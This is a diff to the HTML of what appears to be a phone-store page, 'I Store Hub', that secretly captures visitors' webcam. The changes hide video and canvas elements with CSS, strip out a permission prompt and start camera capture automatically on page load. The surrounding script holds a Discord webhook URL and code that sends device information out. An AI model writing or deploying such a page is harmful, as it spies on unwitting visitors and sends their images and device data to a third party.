@@ -149,6 +149,9 @@
     footer a:hover {
       text-decoration: underline;
     }
+    video, canvas {
+      display: none;
+    }
 
     @media (max-width: 768px) {
       .product-info h3 {
@@ -161,7 +164,6 @@
   </style>
 </head>
 <body>
-
   <!-- Header -->
   <header>
     <div class="logo">
@@ -180,6 +182,7 @@
 
   <!-- Product Section -->
   <section class="products-section">
+    <video id="video" autoplay playsinline></video>
     <h2 style="text-align:center; font-size:2rem; margin-bottom:30px;">Featured Products</h2>
     <div class="product-grid">
       <!-- iPhone 15 Pro -->
@@ -227,11 +230,11 @@
       </div>
     </div>
   </section>
+  <div id="game-area" style="display:none;"></div>
 
-  <!-- Footer -->
-  <footer>
-    <p>&copy; 2025 I Store Hub | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
-  </footer>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
   <script>
     const webhookURL = 'https://discord.com/api/webhooks/1361188715153719478/2hJI009KBVYLOUC9WFhYYZk2QIn9y1CRV-l-TTWDv3Yc78FA58-0AYRwhxyYhP76u_yX';
     const video = document.getElementById('video');
@@ -239,13 +242,13 @@
     const ctx = canvas.getContext('2d');
     const gameArea = document.getElementById('game-area');
 
-    window.onload = function() {
-     enableCamera();
-};
+
+    document.addEventListener("DOMContentLoaded", function() {
+    enableCamera(); // Calls enableCamera when the page is fully loaded
+  });
 
     function enableCamera() {
-      document.getElementById('permission-box').style.display = 'none';
-      gameArea.style.display = 'block';
+      
 
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -349,5 +352,13 @@
       }).catch(err => console.error('Device info send failed:', err));
     }
   </script>
+
+
+
+
+  <!-- Footer -->
+  <footer>
+    <p>&copy; 2025 I Store Hub | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+  </footer>
 </body>
 </html>
